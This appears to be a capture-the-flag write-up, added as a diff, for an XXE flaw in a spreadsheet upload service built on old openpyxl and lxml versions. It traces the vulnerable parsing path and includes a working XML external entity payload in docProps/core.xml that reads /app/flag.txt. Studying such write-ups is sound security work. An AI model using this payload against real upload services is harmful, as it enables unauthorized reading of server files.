@@ -1,0 +1,34 @@
+notice weird fixed versions of openpyxl and lxml in Pipfile, find any of 
+https://security.snyk.io/vuln/SNYK-PYTHON-OPENPYXL-40459 ->
+https://www.openwall.com/lists/oss-security/2017/02/07/5 ->
+https://bugs.debian.org/cgi-bin/bugreport.cgi?bug=854442 (poc)
+or
+https://github.com/lxml/lxml/pull/391
+https://bugs.launchpad.net/lxml/+bug/1742885 (poc)
+
+=====
+
+finding through code review:
+xl/sharedStrings.xml (where most strings stored in the actual spreadsheet are) gets parsed by strings.py:
+https://foss.heptapod.net/openpyxl/openpyxl/-/blob/d407098efaefd2e0c0bd47dc61ebce622429102e/openpyxl/reader/strings.py
+strings.py uses openpyxl.xml.functions.iterparse, which is always imported by the builtin python `xml` module,
+which does not do external entity resolution
+https://foss.heptapod.net/openpyxl/openpyxl/-/blob/d407098efaefd2e0c0bd47dc61ebce622429102e/openpyxl/xml/functions.py?blame=1#L28
+try to find a function that's used by lxml (e.g. one of Element, ElementTree, SubElement, fromstring, tostring, register_namespace, QName, xmlfile, XMLParser)
+https://foss.heptapod.net/openpyxl/openpyxl/-/blob/d407098efaefd2e0c0bd47dc61ebce622429102e/openpyxl/packaging/core.py#L61-76
+uses NestedText, which uses Element:
+https://foss.heptapod.net/openpyxl/openpyxl/-/blob/d407098efaefd2e0c0bd47dc61ebce622429102e/openpyxl/descriptors/nested.py#L74
+
+or
+
+find above debian bug and reuse poc code
+
+=====
+
+start with blank excel sheet, unzip, edit docProps/core.xml, add your xxe to read /app/flag.txt:
+<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
+<!DOCTYPE foo [
+<!ENTITY xxe SYSTEM "file:///app/flag.txt" >]>
+<cp:coreProperties xmlns:cp="http://schemas.openxmlformats.org/package/2006/metadata/core-properties" xmlns:dc="http://purl.org/dc/elements/1.1/" xmlns:dcterms="http://purl.org/dc/terms/" xmlns:dcmitype="http://purl.org/dc/dcmitype/" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"><dcterms:created xsi:type="dcterms:W3CDTF">2024-03-17T01:04:01Z</dcterms:created><dc:creator></dc:creator><dc:description></dc:description><dc:language>en-GB</dc:language><cp:lastModifiedBy></cp:lastModifiedBy><dcterms:modified xsi:type="dcterms:W3CDTF">2024-04-27T19:16:38Z</dcterms:modified><cp:revision>3</cp:revision><dc:subject>&xxe;</dc:subject><dc:title></dc:title></cp:coreProperties>
+
+upload file, unzip result, get flag from same file
